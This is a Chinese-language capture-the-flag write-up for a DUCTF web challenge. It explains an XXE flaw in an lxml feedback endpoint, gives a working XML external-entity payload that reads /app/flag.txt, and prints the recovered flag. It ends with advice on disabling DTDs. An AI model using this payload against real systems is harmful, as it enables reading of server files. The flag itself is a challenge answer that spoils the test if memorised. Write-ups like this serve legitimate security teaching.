# zoo feedback form

## 题目简述

反馈接口直接以 `lxml.etree.XMLParser(resolve_entities=True)` 解析请求体，并把 `<feedback>` 节点的文本回显。开启外部实体解析后，攻击者可让 XML 实体指向本地文件，形成 XXE 本地文件读取；题目应归入 Web。

容器中的目标文件是 `/app/flag.txt`，其内容为 `DUCTF{emU_say$_he!!0_h0!@_ci@0}`。

## 解题过程

页面上的普通表单只是构造 XML；关键在于直接向接口发送自定义 XML 请求体。定义一个名为 `flag` 的外部实体，并把它放进 `feedback` 节点：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY flag SYSTEM "file:///app/flag.txt">
]>
<root>
  <feedback>&flag;</feedback>
</root>
```

解析器会读取 `file:///app/flag.txt`，以其内容替换 `&flag;`。随后程序取出 `feedback` 的文本并在响应中显示，于是得到：

```text
DUCTF{emU_say$_he!!0_h0!@_ci@0}
```

## 方法总结

不可信 XML 应禁用 DTD 与外部实体解析，并使用配置安全的 XML 解析器。仅在前端限制输入并不能修复此类问题：只要后端仍接受原始 HTTP 请求，攻击者就能绕过页面控件而提交带 `DOCTYPE` 的完整文档。
